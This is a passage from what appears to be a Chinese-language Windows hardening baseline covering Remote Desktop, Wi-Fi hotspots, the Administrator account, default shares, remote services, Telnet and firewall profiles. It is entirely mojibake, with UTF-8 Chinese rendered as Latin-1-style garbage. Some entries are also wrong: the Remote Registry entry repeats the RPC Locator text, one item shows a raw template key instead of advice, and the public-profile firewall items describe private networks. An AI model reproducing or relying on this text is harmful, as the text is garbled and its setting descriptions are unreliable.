çš„è®¡ç®—æœºè¿›è¡Œæ›´æ”¹ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šæ§åˆ¶é¢æ¿\\ç”¨æˆ·è´¦æˆ·\\æ›´æ”¹ç”¨æˆ·è´¦æˆ·æ§åˆ¶è®¾ç½®ã€‚ 2.9 å…è®¸Windowsè‡ªåŠ¨è¿æ¥åˆ°å»ºè®®çš„å¼€æ”¾å¼çƒ­ç‚¹ï¼Œä¸è”ç³»äººå…±äº«çš„ç½‘ç»œä»¥åŠæä¾›ä»˜è´¹æœåŠ¡çš„çƒ­ç‚¹ å†…å®¹æè¿°ï¼š æ­¤ç­–ç•¥è®¾ç½®ç¡®å®šç”¨æˆ·æ˜¯å¦å¯ä»¥å¯ç”¨ä»¥ä¸‹ WLAN è®¾ç½®:â€œè¿æ¥åˆ°å»ºè®®çš„å¼€æ”¾çƒ­ç‚¹â€ã€â€œè¿æ¥åˆ°æˆ‘çš„è”ç³»äººå…±äº«çš„ç½‘ç»œâ€å’Œâ€œå¯ç”¨ä»˜è´¹æœåŠ¡â€ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8ï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºâ€œå·²ç¦ç”¨â€ï¼šè®¡ç®—æœºé…ç½®\\ç®¡ç†æ¨¡æ¿\\ç½‘ç»œ\\WLANæœåŠ¡\\WLANè®¾ç½®\\å…è®¸Windowsè‡ªåŠ¨è¿æ¥åˆ°å»ºè®®çš„å¼€æ”¾çƒ­ç‚¹ï¼Œè”ç³»äººå…±äº«çš„ç½‘ç»œä»¥åŠæä¾›ä»˜è´¹æœåŠ¡çš„çƒ­ç‚¹ æ³¨æ„ï¼š é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­¤ç»„ç­–ç•¥è·¯å¾„å¯èƒ½ä¸å­˜åœ¨ã€‚ å®ƒç”±Microsoft Windows 10ç‰ˆæœ¬1511ç®¡ç†æ¨¡æ¿ï¼ˆæˆ–æ›´æ–°ç‰ˆæœ¬ï¼‰é™„å¸¦çš„ç»„ç­–ç•¥æ¨¡æ¿wlansvc.admx / admlæä¾›ã€‚ 2.10 å…è®¸ç”¨æˆ·é€šè¿‡ä½¿ç”¨è¿œç¨‹æ¡Œé¢æœåŠ¡è¿›è¡Œè¿œç¨‹è¿æ¥ å†…å®¹æè¿°ï¼š ä½¿ç”¨æ­¤ç­–ç•¥è®¾ç½®ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨è¿œç¨‹æ¡Œé¢æœåŠ¡é…ç½®å¯¹è®¡ç®—æœºçš„è¿œç¨‹è®¿é—®ã€‚ å¦‚æœå¯ç”¨æ­¤ç­–ç•¥è®¾ç½®ï¼Œåˆ™ç›®æ ‡è®¡ç®—æœºä¸Šçš„â€œè¿œç¨‹æ¡Œé¢ç”¨æˆ·â€ç»„æˆå‘˜ç”¨æˆ·å¯ä»¥ä½¿ç”¨è¿œç¨‹æ¡Œé¢æœåŠ¡è¿œç¨‹è¿æ¥åˆ°è¯¥ç›®æ ‡è®¡ç®—æœºã€‚ å¦‚æœç¦ç”¨æ­¤ç­–ç•¥è®¾ç½®ï¼Œåˆ™ç”¨æˆ·æ— æ³•ä½¿ç”¨è¿œç¨‹æ¡Œé¢æœåŠ¡è¿œç¨‹è¿æ¥åˆ°ç›®æ ‡è®¡ç®—æœºã€‚ç›®æ ‡è®¡ç®—æœºå°†ä¿æŒå½“å‰çš„æ‰€æœ‰è¿æ¥ï¼Œä½†ä¸ä¼šæ¥å—ä»»ä½•æ–°ä¼ å…¥çš„è¿æ¥ã€‚ å¦‚æœæœªé…ç½®æ­¤ç­–ç•¥è®¾ç½®ï¼Œåˆ™è¿œç¨‹æ¡Œé¢æœåŠ¡ä½¿ç”¨ç›®æ ‡è®¡ç®—æœºä¸Šçš„â€œè¿œç¨‹æ¡Œé¢â€è®¾ç½®æ¥ç¡®å®šæ˜¯å¦å…è®¸è¿œç¨‹è¿æ¥ã€‚æ­¤è®¾ç½®ä½äºâ€œç³»ç»Ÿå±æ€§â€è¡¨çš„â€œè¿œç¨‹â€é€‰é¡¹å¡ä¸Šã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å…è®¸è¿›è¡Œè¿œç¨‹è¿æ¥ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7ï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºâ€œå·²ç¦ç”¨â€ï¼šè®¡ç®—æœºé…ç½®\\ç®¡ç†æ¨¡æ¿\\Windowsç»„ä»¶\\è¿œç¨‹æ¡Œé¢æœåŠ¡\\è¿œç¨‹æ¡Œé¢ä¼šè¯ä¸»æœº\\è¿æ¥\\å…è®¸ç”¨æˆ·ä½¿ç”¨è¿œç¨‹æ¡Œé¢æœåŠ¡è¿›è¡Œè¿œç¨‹è¿æ¥ã€‚ Windows XPï¼šè®¡ç®—æœºé…ç½®\\ç®¡ç†æ¨¡æ¿\\Windowsç»„ä»¶\\ç»ˆç«¯æœåŠ¡\\å…è®¸ç”¨æˆ·ä½¿ç”¨è¿œç¨‹ç»ˆç«¯æœåŠ¡è¿œç¨‹è¿æ¥ã€‚ æ³¨æ„ï¼š 1ã€æ­¤ç»„ç­–ç•¥è·¯å¾„ç”±æ‰€æœ‰ç‰ˆæœ¬çš„Microsoft Windowsç®¡ç†æ¨¡æ¿é™„å¸¦çš„ç»„ç­–ç•¥æ¨¡æ¿TerminalServer.admx / admlæä¾›ã€‚ 2ã€åœ¨è¾ƒæ—§çš„Microsoft Windowsç®¡ç†æ¨¡æ¿ä¸­ï¼Œæ­¤è®¾ç½®æœ€åˆåä¸ºWindows 7ï¼†Server 2008 R2ç®¡ç†æ¨¡æ¿ä¸­çš„â€œå…è®¸ç”¨æˆ·ä½¿ç”¨ç»ˆç«¯æœåŠ¡è¿œç¨‹è¿æ¥â€ï¼Œä½†åœ¨â€œ Windows 7ï¼†Server 2008 R2ç®¡ç†æ¨¡æ¿â€ä¸­å·²é‡å‘½åä¸ºâ€œå…è®¸ç”¨æˆ·ä½¿ç”¨è¿œç¨‹æ¡Œé¢æœåŠ¡è¿œç¨‹è¿æ¥â€ã€‚æœ€ç»ˆï¼Œå®ƒå†æ¬¡è¢«é‡å‘½åä¸ºâ€œå…è®¸ç”¨æˆ·ä½¿ç”¨ä»Windows 8.0ï¼†Server 2012ï¼ˆéR2ï¼‰ç®¡ç†æ¨¡æ¿å¼€å§‹çš„è¿œç¨‹æ¡Œé¢æœåŠ¡â€è¿›è¡Œè¿œç¨‹è¿æ¥ã€‚ 2.11 ç®¡ç†å‘˜å¸æˆ·çŠ¶æ€ å†…å®¹æè¿°ï¼š æ­¤å®‰å…¨è®¾ç½®ç¡®å®šæ˜¯å¯ç”¨è¿˜æ˜¯ç¦ç”¨æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šå·²ç¦ç”¨ï¼šæˆ‘çš„ç”µè„‘\\å³é”®\\ç®¡ç†\\è®¡ç®—æœºç®¡ç†ï¼ˆæœ¬åœ°ï¼‰\\æœ¬åœ°ç”¨æˆ·å’Œç»„\\ç”¨æˆ·\\Administratorå±æ€§\\è´¦æˆ·å·²ç¦ç”¨ã€‚ æ³¨æ„ï¼š å¦‚æœåœ¨ç®¡ç†å‘˜å¸æˆ·è¢«ç¦ç”¨ä¹‹åè¯•å›¾é‡æ–°å¯ç”¨å®ƒï¼Œä¸”å¦‚æœå½“å‰ç®¡ç†å‘˜å¯†ç ä¸ç¬¦åˆå¯†ç è¦æ±‚ï¼Œåˆ™æ— æ³•é‡æ–°å¯ç”¨è¯¥å¸æˆ·ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒAdministrators ç»„çš„æŸä¸ªå¤‡ç”¨æˆå‘˜å¿…é¡»é‡ç½®ç®¡ç†å‘˜å¸æˆ·ä¸Šçš„å¯†ç ã€‚æœ‰å…³å¦‚ä½•é‡ç½®å¯†ç çš„ä¿¡æ¯ï¼Œè¯·å‚é˜…â€œé‡ç½®å¯†ç â€ã€‚ åœ¨æŸäº›ç¯å¢ƒä¸‹ï¼Œç¦ç”¨ç®¡ç†å‘˜å¸æˆ·ä¼šæˆä¸ºä¸€ä¸ªç»´æŠ¤é—®é¢˜ã€‚ åœ¨å®‰å…¨æ¨¡å¼å¯åŠ¨ä¸‹ï¼Œç¦ç”¨çš„ç®¡ç†å‘˜å¸æˆ·ä»…åœ¨è¯¥è®¡ç®—æœºæœªåŠ å…¥åŸŸå¹¶ä¸”æ²¡æœ‰ä»»ä½•å…¶ä»–æœ¬åœ°æ´»åŠ¨ç®¡ç†å‘˜å¸æˆ·æ—¶æ‰å¯ä»¥å¯ç”¨ã€‚å¦‚æœè®¡ç®—æœºåŠ å…¥äº†åŸŸï¼Œå°†ä¸èƒ½å¯ç”¨ç¦ç”¨çš„ç®¡ç†å‘˜ã€‚ 2.12 å…è®¸ICMPé‡å®šå‘è¦†ç›–OSPFç”Ÿæˆçš„è·¯ç”± å†…å®¹æè¿°ï¼š Internetæ§åˆ¶æ¶ˆæ¯åè®®ï¼ˆICMPï¼‰é‡å®šå‘å¯¼è‡´å †æ ˆæ£€æµ‹ä¸»æœºè·¯ç”±ã€‚ è¿™äº›è·¯ç”±ä¼šè¦†ç›–â€œå¼€æ”¾å¼æœ€çŸ­è·¯å¾„ä¼˜å…ˆâ€ï¼ˆOSPFï¼‰ç”Ÿæˆçš„è·¯ç”±ã€‚ å¯¹äºä¼ä¸šç¯å¢ƒï¼Œå»ºè®®å°†æ­¤è®¾ç½®é…ç½®ä¸ºâ€œæœªå®šä¹‰â€ï¼Œå¯¹äºé«˜å®‰å…¨æ€§ç¯å¢ƒï¼Œå»ºè®®é…ç½®ä¸ºâ€œç¦ç”¨â€ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºâ€œå·²ç¦ç”¨â€ï¼šè®¡ç®—æœºé…ç½®\\ç®¡ç†æ¨¡æ¿\\MSSï¼ˆä¼ ç»Ÿï¼‰\\MSSï¼šï¼ˆEnableICMPRedirectï¼‰å…è®¸ICMPé‡å®šå‘è¦†ç›–OSPFç”Ÿæˆçš„è·¯ç”±ã€‚ æ³¨æ„ï¼š é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­¤ç»„ç­–ç•¥è·¯å¾„ä¸å­˜åœ¨ã€‚ éœ€è¦é™„åŠ çš„ç»„ç­–ç•¥æ¨¡æ¿ï¼ˆMSS-legacy.admx / admlï¼‰-å¯ä»æ­¤TechNetåšå®¢æ–‡ç« ä¸­è·å¾—ï¼šMSSè®¾ç½®-Microsoftå®‰å…¨æŒ‡å—åšå®¢ã€‚ 2.13 æ£€æŸ¥æ˜¯å¦å…³é—­äº†é»˜è®¤å…±äº« å†…å®¹æè¿°ï¼š æ£€æŸ¥æ˜¯å¦å…³é—­äº†ç³»ç»Ÿé»˜è®¤å…±äº«ï¼Œæœªå…³é—­å°†æ£€æŸ¥ä¸é€šè¿‡ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šâ€œç¦ç”¨â€ã€‚æˆ‘çš„ç”µè„‘\\å³é”®\\ç®¡ç†\\è®¡ç®—æœºç®¡ç†(æœ¬åœ°)\\ æœåŠ¡å’Œåº”ç”¨ç¨‹åº\\æœåŠ¡\\serverï¼›ï¼ˆæˆ–é€šè¿‡ä»¥ä¸‹æ–¹å¼ï¼šåŒæ—¶æŒ‰ä¸‹win+ré”®ï¼Œåœ¨è¿è¡Œçª—å£ä¸­è¾“å…¥services.mscï¼Œå³å¯æ‰“å¼€æœåŠ¡ã€‚ï¼‰ 2.14 è®¾ç½®æ´»åŠ¨ä½†ç©ºé—²çš„è¿œç¨‹æ¡Œé¢æœåŠ¡ä¼šè¯çš„æ—¶é—´é™åˆ¶ å†…å®¹æè¿°ï¼š ä½¿ç”¨æ­¤ç­–ç•¥è®¾ç½®å¯ä»¥æŒ‡å®šæ´»åŠ¨çš„è¿œç¨‹æ¡Œé¢æœåŠ¡ä¼šè¯åœ¨è‡ªåŠ¨æ–­å¼€è¿æ¥ä¹‹å‰å¯ä»¥ä¿æŒç©ºé—²çŠ¶æ€(æ— ç”¨æˆ·è¾“å…¥)çš„æœ€é•¿æ—¶é—´ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7ï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºâ€œå¯ç”¨â€ï¼šè®¡ç®—æœºé…ç½®\\ç®¡ç†æ¨¡æ¿\\Windowsç»„ä»¶\\è¿œç¨‹æ¡Œé¢æœåŠ¡\\è¿œç¨‹æ¡Œé¢ä¼šè¯ä¸»æœº\\ä¼šè¯æ—¶é—´é™åˆ¶\\è®¾ç½®æ´»åŠ¨ä½†ç©ºé—²çš„è¿œç¨‹æ¡Œé¢æœåŠ¡ä¼šè¯çš„æ—¶é—´é™åˆ¶ã€‚ æ³¨æ„ï¼š â€œè®¡ç®—æœºé…ç½®â€å’Œâ€œç”¨æˆ·é…ç½®â€ä¸­éƒ½æœ‰æ­¤ç­–ç•¥è®¾ç½®ã€‚å¦‚æœåŒæ—¶é…ç½®äº†è¿™ä¸¤ä¸ªç­–ç•¥è®¾ç½®ï¼Œåˆ™å°†ä¼˜å…ˆè€ƒè™‘â€œè®¡ç®—æœºé…ç½®â€ç­–ç•¥è®¾ç½®ã€‚ 2.15 TCP/IPç­›é€‰ å†…å®¹æè¿°ï¼š å…è®¸æ‚¨è¿æ¥åˆ°æ‚¨çš„Windowsè®¡ç®—æœºçš„TCP/IPç½‘ç»œæµé‡ç±»å‹ã€‚ åŠ å›ºå»ºè®®ï¼š ç½‘ä¸Šé‚»å±…\\å±æ€§\\æœ¬åœ°è¿æ¥å³é”®å±æ€§\\ Internetåè®®ï¼ˆTCP/IP)\\å±æ€§\\é«˜çº§\\é€‰é¡¹\\TCP/IPç­›é€‰\\å±æ€§\\å¯åŠ¨TCP/IPç­›é€‰çš„åŠŸèƒ½ 3. èµ„æºæ§åˆ¶ 3.1 Remote Access Auto Connection Manager (RasAuto) å†…å®¹æè¿°ï¼š æ¯å½“ç¨‹åºå¼•ç”¨è¿œç¨‹DNSæˆ–NetBIOSåç§°æˆ–åœ°å€æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºåˆ°è¿œç¨‹ç½‘ç»œçš„è¿æ¥ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šâ€œç¦ç”¨â€ã€‚æˆ‘çš„ç”µè„‘\\å³é”®\\ç®¡ç†\\è®¡ç®—æœºç®¡ç†(æœ¬åœ°)\\ æœåŠ¡å’Œåº”ç”¨ç¨‹åº\\æœåŠ¡\\Remote Access Auto Connection Managerï¼›ï¼ˆæˆ–é€šè¿‡ä»¥ä¸‹æ–¹å¼ï¼šåŒæ—¶æŒ‰ä¸‹win+ré”®ï¼Œåœ¨è¿è¡Œçª—å£ä¸­è¾“å…¥services.mscï¼Œå³å¯æ‰“å¼€æœåŠ¡ã€‚ï¼‰ 3.2 Remote Desktop Services (TermService) å†…å®¹æè¿°ï¼š å…è®¸ç”¨æˆ·ä»¥äº¤äº’æ–¹å¼è¿æ¥åˆ°è¿œç¨‹è®¡ç®—æœºã€‚ è¿œç¨‹æ¡Œé¢å’Œè¿œç¨‹æ¡Œé¢ä¼šè¯ä¸»æœºæœåŠ¡å™¨å–å†³äºæ­¤æœåŠ¡ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7ï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šç¦ç”¨ã€‚æˆ‘çš„ç”µè„‘\\å³é”®\\ç®¡ç†\\è®¡ç®—æœºç®¡ç†(æœ¬åœ°)\\ æœåŠ¡å’Œåº”ç”¨ç¨‹åº\\æœåŠ¡\\Remote Desktop Servicesã€‚ï¼ˆæˆ–é€šè¿‡ä»¥ä¸‹æ–¹å¼ï¼šåŒæ—¶æŒ‰ä¸‹win+ré”®ï¼Œåœ¨è¿è¡Œçª—å£ä¸­è¾“å…¥services.mscï¼Œå³å¯æ‰“å¼€æœåŠ¡ã€‚ï¼‰ 3.3 Remote Procedure Call (RPC) Locator (RpcLocator) å†…å®¹æè¿°ï¼š åœ¨Windows 2003å’ŒWindowsçš„æ—©æœŸç‰ˆæœ¬ä¸­ï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰å®šä½å™¨æœåŠ¡ç®¡ç†RPCåç§°æœåŠ¡æ•°æ®åº“ã€‚ åœ¨Windows Vistaå’ŒWindowsçš„æ›´é«˜ç‰ˆæœ¬ä¸­ï¼Œæ­¤æœåŠ¡ä¸æä¾›ä»»ä½•åŠŸèƒ½ï¼Œå¹¶ä¸”æä¾›æ­¤åŠŸèƒ½æ˜¯ä¸ºäº†ä¸åº”ç”¨ç¨‹åºå…¼å®¹ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šç¦ç”¨ã€‚æˆ‘çš„ç”µè„‘\\å³é”®\\ç®¡ç†\\è®¡ç®—æœºç®¡ç†(æœ¬åœ°)\\ æœåŠ¡å’Œåº”ç”¨ç¨‹åº\\æœåŠ¡\\Remote Procedure Call (RPC) Locator (RpcLocator)ã€‚ï¼ˆæˆ–é€šè¿‡ä»¥ä¸‹æ–¹å¼ï¼šåŒæ—¶æŒ‰ä¸‹win+ré”®ï¼Œåœ¨è¿è¡Œçª—å£ä¸­è¾“å…¥services.mscï¼Œå³å¯æ‰“å¼€æœåŠ¡ã€‚ï¼‰ 3.4 Remote Registry (RemoteRegistry) å†…å®¹æè¿°ï¼š åœ¨Windows 2003å’ŒWindowsçš„æ—©æœŸç‰ˆæœ¬ä¸­ï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰å®šä½å™¨æœåŠ¡ç®¡ç†RPCåç§°æœåŠ¡æ•°æ®åº“ã€‚ åœ¨Windows Vistaå’ŒWindowsçš„æ›´é«˜ç‰ˆæœ¬ä¸­ï¼Œæ­¤æœåŠ¡ä¸æä¾›ä»»ä½•åŠŸèƒ½ï¼Œå¹¶ä¸”æä¾›æ­¤åŠŸèƒ½æ˜¯ä¸ºäº†ä¸åº”ç”¨ç¨‹åºå…¼å®¹ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šç¦ç”¨ã€‚æˆ‘çš„ç”µè„‘\\å³é”®\\ç®¡ç†\\è®¡ç®—æœºç®¡ç†(æœ¬åœ°)\\ æœåŠ¡å’Œåº”ç”¨ç¨‹åº\\æœåŠ¡\\Remote Registryï¼ˆæˆ–é€šè¿‡ä»¥ä¸‹æ–¹å¼ï¼šåŒæ—¶æŒ‰ä¸‹win+ré”®ï¼Œåœ¨è¿è¡Œçª—å£ä¸­è¾“å…¥services.mscï¼Œå³å¯æ‰“å¼€æœåŠ¡ã€‚ï¼‰ 3.5 Remote Desktop Configuration (SessionEnv) å†…å®¹æè¿°ï¼š è¿œç¨‹æ¡Œé¢é…ç½®æœåŠ¡ï¼ˆRDCSï¼‰è´Ÿè´£æ‰€æœ‰éœ€è¦SYSTEMä¸Šä¸‹æ–‡çš„ä¸è¿œç¨‹æ¡Œé¢ç›¸å…³çš„é…ç½®å’Œä¼šè¯ç»´æŠ¤æ´»åŠ¨ã€‚ å…¶ä¸­åŒ…æ‹¬æ¯ä¸ªä¼šè¯çš„ä¸´æ—¶æ–‡ä»¶å¤¹ï¼ŒRDä¸»é¢˜å’ŒRDè¯ä¹¦ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7ï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šç¦ç”¨ã€‚æˆ‘çš„ç”µè„‘\\å³é”®\\ç®¡ç†\\è®¡ç®—æœºç®¡ç†(æœ¬åœ°)\\ æœåŠ¡å’Œåº”ç”¨ç¨‹åº\\æœåŠ¡\\Remote Desktop Configurationã€‚ï¼ˆæˆ–é€šè¿‡ä»¥ä¸‹æ–¹å¼ï¼šåŒæ—¶æŒ‰ä¸‹win+ré”®ï¼Œåœ¨è¿è¡Œçª—å£ä¸­è¾“å…¥services.mscï¼Œå³å¯æ‰“å¼€æœåŠ¡ã€‚ï¼‰ 3.6 Remote Desktop Services UserMode Port Redirector (UmRdpService) å†…å®¹æè¿°ï¼š å…è®¸é‡å®šå‘æ‰“å°æœº/é©±åŠ¨å™¨/ç«¯å£ä»¥è¿›è¡ŒRDPè¿æ¥ã€‚ åŠ å›ºå»ºè®®ï¼š helpDocument.baseline.checkItems.1037.suggest æ³¨æ„ï¼š Windows10/8/7ï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šç¦ç”¨ã€‚æˆ‘çš„ç”µè„‘\\å³é”®\\ç®¡ç†\\è®¡ç®—æœºç®¡ç†(æœ¬åœ°)\\ æœåŠ¡å’Œåº”ç”¨ç¨‹åº\\æœåŠ¡\\Remote Desktop Services UserMode Port Redirectorã€‚ï¼ˆæˆ–é€šè¿‡ä»¥ä¸‹æ–¹å¼ï¼šåŒæ—¶æŒ‰ä¸‹win+ré”®ï¼Œåœ¨è¿è¡Œçª—å£ä¸­è¾“å…¥services.mscï¼Œå³å¯æ‰“å¼€æœåŠ¡ã€‚ï¼‰ 3.7 TelnetæœåŠ¡å™¨ å†…å®¹æè¿°ï¼š æä¾›ç½‘ç»œè®¿é—®çš„æœåŠ¡æ˜¯ä¸€ä¸ªæ”»å‡»ç”¨çš„å¾ˆå¥½çš„æ¸ é“ï¼Œåœ¨æ²¡æœ‰å¿…è¦çš„æƒ…å†µä¸‹å»ºè®®å…³é—­ã€‚ åŠ å›ºå»ºè®®ï¼š Windows8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šæˆ‘çš„ç”µè„‘é¼ æ ‡å³é”®â€œç®¡ç†â€\\æ‰“å¼€è®¡ç®—æœºç®¡ç†\\æœåŠ¡å’Œåº”ç”¨ç¨‹åº\\Telnetã€‚ æ³¨æ„ï¼š å¦‚ä½•éªŒè¯telnetæœåŠ¡æ˜¯å¦çœŸçš„å…³é—­äº†ï¼Ÿä½¿ç”¨å¿«æ·é”®winé”®+rï¼Œè¾“å…¥cmdï¼Œç‚¹å‡»ã€ç¡®å®šã€‘ã€‚è¾“å…¥telnet +IPåœ°å€ï¼ˆä¾‹å¦‚ï¼štelnet 192.168.1.1ï¼‰ï¼Œå›è½¦ï¼Œæç¤ºtelnetä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åºæˆ–æ‰¹å¤„ç†æ–‡ä»¶ã€‚è¯´æ˜å·²ç»ç¦æ­¢telnetã€‚ 3.8 IEå—ä¿¡ä»»ç«™ç‚¹æ£€æŸ¥ å†…å®¹æè¿°ï¼š æ£€æŸ¥å¯¹åº”ç«™ç‚¹æ˜¯å¦åŠ å…¥IEå—ä¿¡ä»»ç«™ç‚¹ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šé€šè¿‡ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šå·²å¯ç”¨ã€‚è®¡ç®—æœºé…ç½®\\ç®¡ç†æ¨¡æ¿\\Windowsç»„ä»¶\\Internet Explorer\\Internet æ§åˆ¶é¢æ¿\\å®‰å…¨é¡µ\\ç«™ç‚¹åˆ°åŒºåŸŸåˆ†é…åˆ—è¡¨ã€‚ 3.9 Routing And Remote Access (RemoteAccess) å†…å®¹æè¿°ï¼š ä¸ºå±€åŸŸç½‘å’Œå¹¿åŸŸç½‘ç¯å¢ƒä¸­çš„ä¼ä¸šæä¾›è·¯ç”±æœåŠ¡ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šç¦ç”¨ã€‚æˆ‘çš„ç”µè„‘\\å³é”®\\ç®¡ç†\\è®¡ç®—æœºç®¡ç†(æœ¬åœ°)\\ æœåŠ¡å’Œåº”ç”¨ç¨‹åº\\æœåŠ¡\\Routing and Remote Accessï¼ˆæˆ–é€šè¿‡ä»¥ä¸‹æ–¹å¼ï¼šåŒæ—¶æŒ‰ä¸‹win+ré”®ï¼Œåœ¨è¿è¡Œçª—å£ä¸­è¾“å…¥services.mscï¼Œå³å¯æ‰“å¼€æœåŠ¡ã€‚ï¼‰ 3.10 Windows Event Log å†…å®¹æè¿°ï¼š æ­¤æœåŠ¡ç®¡ç†äº‹ä»¶å’Œäº‹ä»¶æ—¥å¿—ã€‚å®ƒæ”¯æŒæ—¥å¿—è®°å½•äº‹ä»¶ã€æŸ¥è¯¢äº‹ä»¶ã€è®¢é˜…äº‹ä»¶ã€å½’æ¡£äº‹ä»¶æ—¥å¿—ä»¥åŠç®¡ç†äº‹ä»¶å…ƒæ•°æ®ã€‚å®ƒå¯ä»¥ç”¨ XML å’Œçº¯æ–‡æœ¬ä¸¤ç§æ ¼å¼æ˜¾ç¤ºäº‹ä»¶ã€‚åœæ­¢è¯¥æœåŠ¡å¯èƒ½å±åŠç³»ç»Ÿçš„å®‰å…¨æ€§å’Œå¯é æ€§ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7ï¼šæ§åˆ¶é¢æ¿\\ç³»ç»Ÿå’Œå®‰å…¨\\ç®¡ç†å·¥å…·\\æœåŠ¡\\Windows Event Log 3.11 ä¸“ç”¨é…ç½®æ–‡ä»¶çš„:é˜²ç«å¢™çŠ¶æ€ å†…å®¹æè¿°ï¼š æŒ‡å®šå°†è®¡ç®—æœºè¿æ¥åˆ°ä¸“ç”¨ç½‘ç»œä½ç½®æ—¶çš„è¡Œä¸ºã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7ï¼šè®¡ç®—æœºé…ç½®\\ Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\é«˜çº§å®‰å…¨Windows Defenderé˜²ç«å¢™\\é«˜çº§å®‰å…¨Windows Defenderé˜²ç«å¢™-æœ¬åœ°ç»„ç­–ç•¥å¯¹è±¡\\Windows Defenderé˜²ç«å¢™å±æ€§\\ä¸“ç”¨é…ç½®æ–‡ä»¶\\é˜²ç«å¢™çŠ¶æ€ 3.12 å…¬ç”¨é…ç½®æ–‡ä»¶çš„:é˜²ç«å¢™çŠ¶æ€ å†…å®¹æè¿°ï¼š æŒ‡å®šå°†è®¡ç®—æœºè¿æ¥åˆ°ä¸“ç”¨ç½‘ç»œä½ç½®æ—¶çš„è¡Œä¸ºã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7ï¼šè®¡ç®—æœºé…ç½®\\ Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\é«˜çº§å®‰å…¨Windows Defenderé˜²ç«å¢™\\é«˜çº§å®‰å…¨Windows Defenderé˜²ç«å¢™-æœ¬åœ°ç»„ç­–ç•¥å¯¹è±¡\\Windows Defenderé˜²ç«å¢™å±æ€§\\å…¬ç”¨é…ç½®æ–‡ä»¶\\é˜²ç«å¢™çŠ¶æ€ 3.13 å…¬ç”¨é…ç½®æ–‡ä»¶çš„:åº”ç”¨æœ¬åœ°é˜²ç«å¢™è§„åˆ™ å†…å®¹æè¿°ï¼š æŒ‡å®šå°†è®¡ç®—æœºè¿æ¥åˆ°ä¸“ç”¨ç½‘ç»œä½ç½®æ—¶çš„è¡Œä¸ºã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7ï¼šè®¡ç®—æœºé…ç½®\\ Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\é«˜çº§å®‰å…¨Windows Defenderé˜²ç«å¢™\\é«˜çº§å®‰å…¨Windows Defenderé˜²ç«å¢™-æœ¬åœ°ç»„ç­–ç•¥å¯¹è±¡\\Windows Defenderé˜²ç«å¢™å±æ€§\\å…¬ç”¨é…ç½®æ–‡ä»¶\\æŒ‡å®šWindows Defenderé˜²ç«å¢™è¡Œä¸ºçš„è®¾ç½®-è‡ªå®šä¹‰\\åº”ç”¨æœ¬åœ°é˜²ç«å¢™è§„åˆ™è®¾ç½®ä¸ºå¦ 3.14 Windowsé˜²ç«å¢™æ£€æŸ¥ï¼ˆä»…é’ˆå¯¹Xpç³»ç»Ÿï¼‰ å†…å®¹æè¿°ï¼š æ£€æŸ¥é˜²ç«å¢™å¯ç”¨çŠ¶æ€ã€‚ åŠ å›ºå»ºè®®ï¼š 